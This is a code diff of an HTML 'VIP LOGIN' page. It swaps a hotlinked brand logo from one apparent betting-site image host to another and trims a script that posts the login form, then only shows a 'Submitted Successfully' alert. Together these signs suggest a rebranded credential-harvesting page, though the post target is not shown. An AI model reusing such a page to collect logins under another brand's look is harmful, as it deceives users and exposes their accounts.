@@ -7,7 +7,7 @@
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
-    <link rel="stylesheet" href="styles.css">   <!-- jodi styles.css hoy tahole ei line thakbe -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
@@ -15,7 +15,7 @@
 <div class="login-box">
 
 <div class="logo">
-    <img src="https://images.23924894.com/wsd-images-prod/pkokbdtf6/fe_setting/web_logo/wps_PKOK_logo_20250501154628.png">
+    <img src="https://images.3820949.com/wsd-images-prod/333okbdts2/fe_setting/web_logo/wps_333ok_20260210135317.png">
     <h2>VIP LOGIN</h2>
 </div>
 
@@ -46,8 +46,7 @@
     </button>
 
     <p class="register">
-        Don't have an account? 
-        <a href="#">Register Now</a>
+        Don't have an account? <a href="#">Register Now</a>
     </p>
 </form>
 
@@ -55,7 +54,6 @@
 </div>
 
 <script>
-// Form Submit
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
@@ -65,13 +63,12 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         method: 'POST',
         body: formData
     })
-    .then(response => {
+    .then(() => {
         alert("✅ Submitted Successfully!");
-        this.reset();   // Form clear hoye jabe
+        this.reset();
     })
-    .catch(error => {
-        alert("❌ Error! Please try again.");
-        console.error(error);
+    .catch(() => {
+        alert("❌ Something went wrong!");
     });
 });
 </script>
